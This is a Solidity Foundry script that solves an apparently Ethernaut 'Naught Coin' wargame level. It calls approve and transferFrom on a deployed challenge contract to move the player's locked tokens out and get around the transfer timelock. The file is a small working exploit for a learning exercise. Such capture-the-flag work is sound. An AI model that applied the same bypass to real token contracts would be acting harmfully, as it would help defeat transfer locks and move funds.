// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/15_Naught_Coin.sol";

contract POC is Script {
    NaughtCoin public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = NaughtCoin(0xf8d4DaD8A33Afb6Cf8482f243CbD22F13194cd8E);
        address owner = vm.envAddress("MY_ADDRESS");

        uint256 balance = target.balanceOf(owner);
        console.log("before balance: ", balance);

        target.approve(owner, balance);
        target.transferFrom(owner, address(target), balance);

        balance = target.balanceOf(owner);
        console.log("after  balance: ", balance);
        vm.stopBroadcast();
    }
}